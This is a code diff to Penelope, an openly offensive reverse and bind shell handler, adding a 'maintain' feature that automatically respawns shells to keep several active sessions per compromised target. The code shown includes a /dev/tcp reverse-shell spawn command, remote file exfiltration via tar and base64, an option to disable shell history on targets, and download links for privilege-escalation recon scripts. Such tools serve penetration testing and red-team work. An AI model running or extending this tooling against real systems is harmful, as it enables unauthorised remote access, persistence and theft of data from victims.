@@ -51,7 +51,7 @@ from pathlib import Path
 from datetime import datetime
 from functools import wraps
 from itertools import islice
-from collections import deque
+from collections import deque, defaultdict
 
 try:
 	import readline
@@ -73,6 +73,7 @@ class MainMenu(cmd.Cmd):
 			"upload <glob|URL>...",
 			"recon [sessionID]",
 			"spawn [Port] [Host]",
+			"maintain [NUM]",
 			"upgrade [sessionID]",
 			"dir|. [sessionID]",
 			"listeners [<add|stop> <Interface|IP> <Port>]",
@@ -160,34 +161,34 @@ class MainMenu(cmd.Cmd):
 		__class__.write_history(options.cmd_histfile)
 
 	def emptyline(self):
-		self.lastcmd=None
+		self.lastcmd = None
 
 	def do_help(self, line):
 		"""Show menu help or help about specific command"""
-		commands=[]
+		commands = []
 
 		if line:
 			for command in self.commands:
-				if re.split(' |\|',command)[0]==line:
-					commands=[command]
+				if re.split(' |\|',command)[0] == line:
+					commands = [command]
 					break
 			else:
 				cmdlogger.warning("No such command")
 		else:
-			commands=self.commands
+			commands = self.commands
 
 		for command in commands:
 			print('\n'+paint(command,'green'))
-			command=re.split(' |\|',command)[0]
-			help_text=getattr(self, f"do_{command}").__doc__
-			lines=textwrap.wrap(textwrap.dedent(help_text))
+			command = re.split(' |\|',command)[0]
+			help_text = getattr(self, f"do_{command}").__doc__
+			lines = textwrap.wrap(textwrap.dedent(help_text))
 			print(textwrap.indent("\n".join(lines), '  '))
 		print()
 
 	@session(extra=['none'])
 	def do_use(self, ID):
 		"""Select a session"""
-		if ID=='none':
+		if ID == 'none':
 			self.set_id(None)
 		else:
 			self.set_id(ID)
@@ -200,7 +201,7 @@ class MainMenu(cmd.Cmd):
 		else:
 			if core.sessions:
 				for session in core.sessions.values():
-					print(session,flush=True)
+					print(session, flush=True)
 				print(flush=True)
 			else:
 				cmdlogger.warning("No sessions yet 😟")
@@ -223,10 +224,10 @@ class MainMenu(cmd.Cmd):
 			try:
 				if session_count > 1:
 					__class__.set_auto_history(False)
-					answer=input(f"\r{paint(f'[?] Kill all ({session_count}) sessions? (y/N): ','yellow')}")
+					answer = input(f"\r{paint(f'[?] Kill all ({session_count}) sessions? (y/N): ','yellow')}")
 					__class__.set_auto_history(True)
 				else:
-					answer='y'
+					answer = 'y'
 
 			except EOFError:
 				return self.do_kill(line)
@@ -263,7 +264,7 @@ class MainMenu(cmd.Cmd):
 				cmdlogger.warning(f"More than {options.max_open_files} items selected"
 						f" for opening. The open list is truncated to "
 						f"{options.max_open_files}.")
-				items=items[:options.max_open_files]
+				items = items[:options.max_open_files]
 
 			for item in items:
 				Open(item)
@@ -311,6 +312,27 @@ class MainMenu(cmd.Cmd):
 		core.sessions[self.sid].spawn(port, host)
 
 	@session(current=True)
+	def do_maintain(self, line):
+		"""\
+		Maintain NUM active shells for the same target.
+		"""
+		if line:
+			if line.isnumeric():
+				num = int(line)
+				if 2 <= num <= options.max_maintain:
+					options.maintain = num
+					core.sessions[self.sid].maintain()
+				else:
+					cmdlogger.warning(f"The value must be between 2 and {options.max_maintain}")
+			else:
+				cmdlogger.error("Invalid number")
+		else:
+			if options.maintain >= 2:
+				cmdlogger.info(f"Current value is {paint(options.maintain, 'yellow')}")
+			else:
+				cmdlogger.error("Maintain is currently disabled")
+
+	@session(current=True)
 	def do_upgrade(self, ID):
 		"""\
 		Upgrade the session's shell to "PTY". If it fails attempts to upgrade it to "Advanced".
@@ -328,7 +350,7 @@ class MainMenu(cmd.Cmd):
 		if line:
 			try:
 				subcommand, host, port = line.split(" ")
-				port=int(port)
+				port = int(port)
 
 			except ValueError:
 				try:
@@ -356,7 +378,7 @@ class MainMenu(cmd.Cmd):
 				Listener(host,port)
 			elif subcommand == "stop":
 				for listener in core.listeners:
-					if (listener.host,listener.port)==(host,port):
+					if (listener.host,listener.port) == (host,port):
 						listener.stop()
 						break
 				else:
@@ -389,7 +411,7 @@ class MainMenu(cmd.Cmd):
 		"""Show sample commands to run on the targets to get reverse shell, based on the registered listeners"""
 		print()
 		for listener in core.listeners:
-			print(listener.hints,end='\n\n')
+			print(listener.hints, end='\n\n')
 
 	def do_reset(self, line):
 		"""Reset the local terminal"""
@@ -471,7 +493,7 @@ class MainMenu(cmd.Cmd):
 					orig_var_type = type(getattr(options, param)).__name__
 					new_var_type = type(eval(new_value)).__name__
 					if orig_var_type == new_var_type:
-						exec(f'options.{param}={new_value}')
+						exec(f'options.{param} = {new_value}')
 						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param), 'yellow')}")
 					else:
 						cmdlogger.error(f"Wrong value type: Expect <{orig_var_type}>, not <{new_var_type}>")
@@ -488,13 +510,13 @@ class MainMenu(cmd.Cmd):
 		elif line == '.':
 			return self.onecmd('dir')
 		else:
-			parts=line.split()
-			candidates=[command for command in self.raw_commands if command.startswith(parts[0])]
+			parts = line.split()
+			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
 			if not candidates:
 				cmdlogger.warning(f"Invalid command '{line}'. "
 						f"Please issue 'help' for all available commands")
 			elif len(candidates) == 1:
-				cmd=f"{candidates[0]} {' '.join(parts[1:])}"
+				cmd = f"{candidates[0]} {' '.join(parts[1:])}"
 				print(f"\x1b[1A{self.prompt}{cmd}")
 				return self.onecmd(cmd)
 			else:
@@ -504,13 +526,13 @@ class MainMenu(cmd.Cmd):
 		return [option for option in options.__dict__ if option.startswith(text)]
 
 	def complete_listeners(self, text, line, begidx, endidx):
-		subcommands=["add","stop"]
+		subcommands = ["add","stop"]
 		if begidx == 10:
 			return [command for command in subcommands if command.startswith(text)]
 		if begidx == 14:
 			return [iface_ip for iface_ip in Interfaces().list_all + ['any','0.0.0.0'] if iface_ip.startswith(text)]
 		if begidx == 15:
-			listeners=[re.search(r'\((.*)\)', str(listener))[1].replace(':',' ') for listener in core.listeners]
+			listeners = [re.search(r'\((.*)\)', str(listener))[1].replace(':',' ') for listener in core.listeners]
 			if len(listeners) > 1:
 				listeners.append('all')
 			return [listener for listener in listeners if listener.startswith(text)]
@@ -571,13 +593,21 @@ class Core:
 	def threads(self):
 		return (thread.name for thread in threading.enumerate())
 
+	@property
+	def hosts(self):
+		hosts = defaultdict(list)
+		for session in self.sessions.values():
+			hosts[session.name].append(session)
+		return hosts
+
 	def start(self):
 		if not self.started:
-			self.started=True
+			self.started = True
 			threading.Thread(target=self.loop, name="Core").start()
 
 			if options.no_attach and not options.plain:
 				menu.show()
+
 	def loop(self):
 		while True:
 			try:
@@ -601,10 +631,11 @@ class Core:
 
 				# The listeners
 				elif readable.__class__ is Listener:
-					logger.debug("New connection came")
 					socket, endpoint = readable.socket.accept()
+					thread_name = f"IncomingConnection-{endpoint}"
+					logger.debug(f"New thread: {thread_name}")
 					threading.Thread(target=Session, args=(socket,*endpoint,readable),
-							name="IncomingConnection").start()
+							name=thread_name).start()
 
 				# STDIN
 				elif readable is sys.stdin:
@@ -617,7 +648,7 @@ class Core:
 							session.update_pty_size()
 
 						if session.is_cmd:
-							self._cmd=data
+							self._cmd = data
 
 						if data == options.ESCAPE:
 							if session.alternate_buffer:
@@ -651,10 +682,10 @@ class Core:
 							if b'\x1b[?1049h' in data:
 #								if readable.type != 'PTY':
 #									data = data.replace(b'\x1b[?1049h', b'')
-								readable.alternate_buffer=True
+								readable.alternate_buffer = True
 
 							if b'\x1b[?1049l' in data:
-								readable.alternate_buffer=False
+								readable.alternate_buffer = False
 
 							if readable.is_cmd and self._cmd == data:
 								data, self._cmd = b'', b''
@@ -677,6 +708,8 @@ class Core:
 							pass
 
 	def stop(self):
+		options.maintain = 0
+
 		sessions = self.sessions.copy().values()
 		if sessions:
 			logger.warning(f"Killing sessions...")
@@ -849,7 +882,7 @@ class Session:
 		else:
 			self.hostname = target
 
-		self.name=f"{self.hostname}~{self.ip}" if self.hostname else self.ip
+		self.name = f"{self.hostname}~{self.ip}" if self.hostname else self.ip
 		self.listener = listener
 		self.latency = options.LATENCY
 
@@ -894,38 +927,52 @@ class Session:
 			if not options.no_log:
 				self.directory.mkdir(parents=True, exist_ok=True)
 				self.logpath = self.directory / f"{self.name}.log"
-				self.logfile = open(self.logpath,'ab',buffering=0)
+				self.logfile = open(self.logpath, 'ab', buffering=0)
 				if not options.no_timestamps and not self.logpath.exists():
 					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ",'magenta')).encode())
 
 			if options.single_session and self.listener:
 				self.listener.stop()
 
-			if not options.no_attach:				# If auto-attach is enabled
-				if all([					# - IF -
-					self.listener,				# Is reverse shell
-					core.attached_session is None,		# Not any attached session present
-					not "Menu" in core.threads		# Menu is not active
-				]) or (						# - OR -
-					not self.listener			# Is bind shell
-				    and not menu.lastcmd.startswith('spawn')	# Is not spawned
-				):						# - THEN -
-					self.attach()				# Attach session
+			self.maintain()
+
+			# If auto-attach is enabled and no other session is attached
+			if not options.no_attach and core.attached_session is None:
+				# If is reverse shell and the Menu is not active
+				if ((self.listener and not "Menu" in core.threads)
+				# Or is a bind shell and is not spawned from the Menu
+				or (not self.listener and not "Menu" in core.threads)
+				# Or is a bind shell and is spawned from the connect Menu command
+				or (not self.listener and "Menu" in core.threads and menu.lastcmd.startswith('connect'))):
+					# Then attach the newly created session
+					self.attach()
+
+
+	def maintain(self):
+		current_num = len(core.hosts[self.name])
+		if current_num < options.maintain > 1:
+			try:
+				logger.warning(paint(f" ╒ Trying to maintain {options.maintain} "
+						f"active shells on {self.name} * |current {current_num}|",'blue')
+				)
+				core.hosts[self.name][-1].spawn()
+			except IndexError:
+				logger.error("No alive shell left. Cannot spawn another")
 
 	def __bool__(self):
-		return bool(self.socket.fileno()!=-1 and self.OS)
+		return bool(self.socket.fileno() != -1 and self.OS)
 
 	def __str__(self):
 		if menu.sid == self.id:
-			ID = paint('['+str(self.id)+']','red')
+			ID = paint('[' + str(self.id) + ']','red')
 
 		elif self.new:
-			ID = paint('<'+str(self.id)+'>','yellow','BLINK')
+			ID = paint('<' + str(self.id) + '>','yellow','BLINK')
 
 		else:
-			ID = paint('('+str(self.id)+')','yellow')
+			ID = paint('(' + str(self.id) + ')','yellow')
 
-		source='Reverse shell from '+str(self.listener) if self.listener \
+		source = 'Reverse shell from ' + str(self.listener) if self.listener \
 			else f'Bind shell (port {self.port})'
 
 		return (f"\n{paint('SessionID ','blue')}{ID}\n"
@@ -1110,10 +1157,10 @@ class Session:
 
 					self.socket.sendall(cmd)
 
-					start=time.perf_counter()
+					start = time.perf_counter()
 
 				except OSError as e:
-					if e.errno==errno.EBADF:
+					if e.errno == errno.EBADF:
 						self.lock.release()
 						return None
 
@@ -1259,7 +1306,7 @@ class Session:
 					#self.record(self.prompt)
 					return True
 
-				cmd=f"bash -i 2>&1 ; if [ $? -eq 127 ]; then echo {token}; else exit 0; fi"
+				cmd = f"bash -i 2>&1 ; if [ $? -eq 127 ]; then echo {token}; else exit 0; fi"
 
 				if options.no_bash:
 					cmd = cmd.replace('bash',rand())
@@ -1391,14 +1438,14 @@ class Session:
 				local_download_folder = self.directory / "downloads"
 				local_download_folder.mkdir(parents=True, exist_ok=True)
 
-				cmd=f"tar cz {remote_item_path} 2>/dev/null|base64 -w0"
-				data=self.exec(cmd, raw=False, timeout=options.LONG_TIMEOUT)
+				cmd = f"tar cz {remote_item_path} 2>/dev/null|base64 -w0"
+				data = self.exec(cmd, raw=False, timeout=options.LONG_TIMEOUT)
 				#print(data)
 				if not data:
 					logger.error("Corrupted response")
 					return []
 
-				tar=tarfile.open(fileobj=io.BytesIO(base64.b64decode(data)))
+				tar = tarfile.open(fileobj=io.BytesIO(base64.b64decode(data)))
 
 				items = tar.getnames()
 				if not items:
@@ -1530,7 +1577,7 @@ class Session:
 				if not host: host = _host
 				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
 				# bash -i doesn't always work
-				cmd=f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
+				cmd = f'bash -c "exec bash >& /dev/tcp/{host}/{port} 0>&1 &"'
 				if options.no_bash:
 					cmd = cmd.replace('bash',rand())
 				#timeout=None if self.interactive else self.latency
@@ -1576,6 +1623,8 @@ class Session:
 			if not hasattr(self,'is_invalid'):
 				logger.error(f"{paint(self.name,'RED','white')}"
 				f"{paint('','red',reset=False)} disconnected 💔\r")
+
+		self.maintain()
 
 	def exit(self):
 		self.kill()
@@ -1641,17 +1690,17 @@ class Color:
 
 class CustomFormatter(logging.Formatter):
 	TEMPLATES = {
-		logging.CRITICAL:	{'color':"RED",		'prefix':'[!!!]'},
-		logging.ERROR:		{'color':"red",		'prefix':'[-]'},
-		logging.WARNING:	{'color':"yellow",	'prefix':'[!]'},
-		logging.INFO:		{'color':"green",	'prefix':'[+]'},
-		logging.DEBUG:		{'color':"magenta",	'prefix':'[---DEBUG---]'}
+		logging.CRITICAL:	{'color':"RED",		'prefix':"[!!!]"},
+		logging.ERROR:		{'color':"red",		'prefix':"[-]"},
+		logging.WARNING:	{'color':"yellow",	'prefix':"[!]"},
+		logging.INFO:		{'color':"green",	'prefix':"[+]"},
+		logging.DEBUG:		{'color':"magenta",	'prefix':"[---DEBUG---]"}
 	}
 	def format(self, record):
 		template = __class__.TEMPLATES[record.levelno]
 		if core.attached_session is not None: print()
-		text = f"\r{template['prefix']} {logging.Formatter.format(self,record)}"
-		return paint(text,template['color'])
+		text = f"\r{template['prefix']} {logging.Formatter.format(self, record)}"
+		return paint(text, template['color'])
 
 
 def ControlC(num, stack):
@@ -1674,54 +1723,21 @@ class Options:
 		if level:
 			level = level if value else 'INFO'
 			logging.getLogger(__program__).setLevel(getattr(logging, level))
+		if option == 'maintain':
+			if value > options.max_maintain:
+				logger.warning(f"Maintain value decreased to the max ({options.max_maintain})")
+				value = options.max_maintain
 		self.__dict__[option] = value
 
 
+# HARDCODED OPTIONS
 options = Options()
-
-# OPTIONS
-parser = argparse.ArgumentParser(description="Penelope Shell Handler", add_help=False)
-
-parser.add_argument("PORT", nargs='?', help="Port to listen/connect to depending on -i/-c options. Default: 4444", default=4444)
-
-method = parser.add_argument_group("Reverse or Bind shell?")
-method.add_argument("-i", "--address", help="IP Address or Interface to listen on. Default: 0.0.0.0", default="0.0.0.0",metavar='')
-method.add_argument("-c", "--connect", help="Bind shell Host",metavar='')
-
-hints = parser.add_argument_group("Hints")
-hints.add_argument("-a", "--hints", help="Show sample payloads for reverse shell based on the registered listeners", action="store_true")
-hints.add_argument("-l", "--interfaces", help="Show the available network interfaces",action="store_true")
-hints.add_argument("-h", "--help", action="help", help="show this help message and exit")
-
-verbosity = parser.add_argument_group("Verbosity")
-verbosity.add_argument("-Q", "--silent", help="Be a bit less verbose", action="store_true")
-verbosity.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
-
-log = parser.add_argument_group("Logging")
-log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
-log.add_argument("-T", "--no-timestamps", help="Do not include timestamps on logs", action="store_true")
-
-misc = parser.add_argument_group("Misc")
-misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
-misc.add_argument("-P", "--plain", help="Just land to the main menu", action="store_true")
-misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
-misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
-misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
-
-debug = parser.add_argument_group("Debug")
-debug.add_argument("-NP", "--no-python", help="Simulate python absence on target", action="store_true")
-debug.add_argument("-NB", "--no-bash", help="Simulate bash absence on target", action="store_true")
-debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")
-
-args = [] if not __name__ == "__main__" else None
-parser.parse_args(args, options)
-
-# SEMICONSTANT OPTIONS
 options.ESCAPE = b'\x1b[24~' # F12
 options.LONG_TIMEOUT = 60
 options.SHORT_TIMEOUT = 5
 options.LATENCY = .01
 options.max_open_files = 5
+options.max_maintain = 10
 options.upload_chunk_size = 10240
 options.BASEDIR = Path.home() / f'.{__program__}'
 options.cmd_histfile = options.BASEDIR / 'cmd_history'
@@ -1729,19 +1745,16 @@ options.debug_histfile = options.BASEDIR / 'cmd_debug_history'
 options.histlength = 1000
 options.useragent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
 
-# EXTRAS
-options.recon_scripts = {
-'Unix':[
-	'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
-	'https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh'
-],
-'Windows':[
-	'https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'
-]}
+# INIT
+paint = Color()
+core = Core()
+menu = MainMenu()
+signal.signal(signal.SIGINT, ControlC)
+OS = platform.system()
+options.BASEDIR.mkdir(parents=True, exist_ok=True)
 
 # CONSTANTS
 OSes = {'Unix':'🐧','Windows':'💻'}
-OS = platform.system()
 TTY_NORMAL = termios.tcgetattr(sys.stdin)
 
 pathlink = lambda filepath: (f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
@@ -1755,14 +1768,18 @@ Open =	lambda item:\
 
 rand = lambda: ''.join(random.choice(string.ascii_letters) for i in range(8))
 
-chunks = lambda string,length:(string[0+i:length+i] for i in range(0, len(string), length))
+chunks = lambda string, length: (string[0+i:length+i] for i in range(0, len(string), length))
 
-# INIT
-paint = Color()
-menu = MainMenu()
-core = Core()
-signal.signal(signal.SIGINT, ControlC)
-options.BASEDIR.mkdir(parents=True, exist_ok=True)
+
+# EXTRAS
+options.recon_scripts = {
+'Unix':[
+	'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
+	'https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh'
+],
+'Windows':[
+	'https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'
+]}
 
 # LOGGING
 stdout_handler = logging.StreamHandler()
@@ -1784,6 +1801,44 @@ logger.addHandler(debug_file_handler)
 cmdlogger = logging.getLogger(f"{__program__}_cmd")
 cmdlogger.setLevel(logging.INFO)
 cmdlogger.addHandler(stdout_handler)
+
+# CMD OPTIONS
+parser = argparse.ArgumentParser(description="Penelope Shell Handler", add_help=False)
+
+parser.add_argument("PORT", nargs='?', help="Port to listen/connect to depending on -i/-c options. Default: 4444", default=4444)
+
+method = parser.add_argument_group("Reverse or Bind shell?")
+method.add_argument("-i", "--address", help="IP Address or Interface to listen on. Default: 0.0.0.0", default="0.0.0.0", metavar='')
+method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')
+
+hints = parser.add_argument_group("Hints")
+hints.add_argument("-a", "--hints", help="Show sample payloads for reverse shell based on the registered listeners", action="store_true")
+hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
+hints.add_argument("-h", "--help", action="help", help="show this help message and exit")
+
+verbosity = parser.add_argument_group("Verbosity")
+verbosity.add_argument("-Q", "--silent", help="Be a bit less verbose", action="store_true")
+verbosity.add_argument("-d", "--debug", help="Show debug messages", action="store_true")
+
+log = parser.add_argument_group("Logging")
+log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
+log.add_argument("-T", "--no-timestamps", help="Do not include timestamps on logs", action="store_true")
+
+misc = parser.add_argument_group("Misc")
+misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, default=0, metavar='')
+misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
+misc.add_argument("-P", "--plain", help="Just land to the main menu", action="store_true")
+misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
+misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
+misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")
+
+debug = parser.add_argument_group("Debug")
+debug.add_argument("-NP", "--no-python", help="Simulate python absence on target", action="store_true")
+debug.add_argument("-NB", "--no-bash", help="Simulate bash absence on target", action="store_true")
+debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")
+
+args = [] if not __name__ == "__main__" else None
+parser.parse_args(args, options)
 
 # MAIN
 if __name__ == "__main__":
